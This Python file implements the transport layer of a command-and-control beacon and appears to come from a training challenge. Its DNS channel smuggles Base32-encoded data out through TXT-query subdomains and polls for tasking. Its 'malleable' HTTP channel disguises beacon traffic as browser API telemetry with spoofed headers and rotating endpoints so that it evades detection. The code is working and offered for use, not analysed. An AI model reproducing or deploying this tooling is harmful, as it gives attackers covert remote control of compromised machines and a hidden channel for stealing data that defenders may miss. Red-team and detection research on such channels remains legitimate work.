from abc import ABC, abstractmethod
import base64
import logging
import random
import socket
from dnslib import DNSRecord, QTYPE
import requests
from websockets.sync.client import connect

logger = logging.getLogger("beacon_transport")

class Transport(ABC):
    """Abstract Base Class defining the C2 transport interface."""
    
    @abstractmethod
    def connect(self) -> bool:
        pass

    @abstractmethod
    def send(self, data: str) -> None:
        pass

    @abstractmethod
    def receive(self) -> str:
        pass

    @abstractmethod
    def close(self) -> None:
        pass


class WebSocketTransport(Transport):
    """WebSocket-based C2 transport implementation."""

    def __init__(self, uri: str, session_id: str):
        self.uri = f"{uri}?session_id={session_id}"
        self.websocket = None

    def connect(self) -> bool:
        try:
            logger.info(f"Connecting to WebSocket C2 at {self.uri}")
            self.websocket = connect(self.uri)
            return True
        except Exception as e:
            logger.error(f"WebSocket connection failed: {e}")
            return False

    def send(self, data: str) -> None:
        if self.websocket:
            self.websocket.send(data)

    def receive(self) -> str:
        if self.websocket:
            return self.websocket.recv()
        return ""

    def close(self) -> None:
        if self.websocket:
            try:
                self.websocket.close()
            except Exception:
                pass
            self.websocket = None


class DNSTransport(Transport):
    """DNS-based C2 transport using Base32 encoded subdomain queries and TXT responses via direct socket."""

    def __init__(self, domain: str, session_id: str, dns_server_ip: str = "192.168.0.152", dns_server_port: int = 53):
        self.domain = domain  # e.g., "c2.localhost"
        self.session_id = session_id
        self.dns_server_ip = dns_server_ip
        self.dns_server_port = dns_server_port

    def connect(self) -> bool:
        logger.info(f"Initialized DNS transport targeting domain: {self.domain} -> {self.dns_server_ip}:{self.dns_server_port}")
        return True  # UDP/DNS is connectionless

    def _send_dns_query(self, qname: str) -> str:
        """Constructs a raw DNS packet and sends it directly to the local DNS server socket."""
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.settimeout(3.0)
        try:
            query = DNSRecord.question(qname, qtype="TXT")
            packet = query.pack()

            sock.sendto(packet, (self.dns_server_ip, self.dns_server_port))
            data, _ = sock.recvfrom(512)
            reply = DNSRecord.parse(data)
            if reply.rr:
                for rr in reply.rr:
                    if rr.rtype == QTYPE.TXT:
                        return str(rr.rdata).strip('"')
        except socket.timeout:
            logger.debug(f"DNS query timed out for {qname}")
        except Exception as e:
            logger.debug(f"DNS query error for {qname}: {e}")
        finally:
            sock.close()
        return ""

    def send(self, data: str) -> None:
        """Encodes encrypted payload string into Base32 chunks and sends via direct DNS TXT queries."""
        encoded_bytes = base64.b32encode(data.encode("utf-8"))
        encoded_str = encoded_bytes.decode("utf-8").rstrip("=")  # Strip padding
        
        # Split into 50-character chunks to stay safe within DNS label length constraints
        chunk_size = 50
        chunks = [encoded_str[i:i+chunk_size] for i in range(0, len(encoded_str), chunk_size)]
        total_chunks = len(chunks)
        
        for seq, chunk in enumerate(chunks):
            query_name = f"{seq + 1}.{total_chunks}.{chunk}.{self.session_id}.{self.domain}"
            self._send_dns_query(query_name)
    def receive(self) -> str:
        """Polls the C2 server via a heartbeat query to fetch pending encrypted tasks."""
        heartbeat_query = f"heartbeat.0.0.{self.session_id}.{self.domain}"
        txt_record = self._send_dns_query(heartbeat_query)
        
        if txt_record and txt_record not in ["Not Found", "no tasks", ""]:
            return txt_record
        return ""

    def close(self) -> None:
        pass


class MalleableHTTPTransport(Transport):
    """Malleable HTTP C2 transport mimicking a legitimate web API service (Challenge 13)."""

    def __init__(self, base_url: str, session_id: str):
        self.base_url = base_url.rstrip("/")
        self.session_id = session_id
        self.endpoints = [
            "/api/v2/feed",
            "/api/v1/profile",
            "/api/notifications",
            "/v3/telemetry/sync"
        ]
        self.session = requests.Session()
        self.session.headers.update({
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Accept": "application/json, text/plain, */*",
            "Accept-Language": "en-US,en;q=0.9",
            "Cache-Control": "no-cache",
            "Connection": "keep-alive"
        })

    def connect(self) -> bool:
        logger.info(f"Initialized Malleable HTTP transport targeting {self.base_url}")
        return True

    def send(self, data: str) -> None:
        endpoint = random.choice(self.endpoints)
        url = f"{self.base_url}{endpoint}"
        
        encoded_data = base64.b32encode(data.encode("utf-8")).decode("utf-8").rstrip("=")
        payload = {
            "client_id": self.session_id,
            "metric_type": "telemetry",
            "data": encoded_data
        }
        
        try:
            response = self.session.post(url, json=payload, timeout=5.0)
            logger.debug(f"Malleable POST sent to {endpoint} - Status: {response.status_code}")
        except Exception as e:
            logger.debug(f"Malleable send error: {e}")

    def receive(self) -> str:
        endpoint = random.choice(self.endpoints)
        url = f"{self.base_url}{endpoint}"
        params = {
            "user": self.session_id,
            "ts": "true"
        }
        
        try:
            response = self.session.get(url, params=params, timeout=5.0)
            if response.status_code == 200:
                body = response.json()
                items = body.get("data", {}).get("items", [])
                if items:
                    return items[0]
        except Exception as e:
            logger.debug(f"Malleable receive error: {e}")
            
        return ""

    def close(self) -> None:
        self.session.close()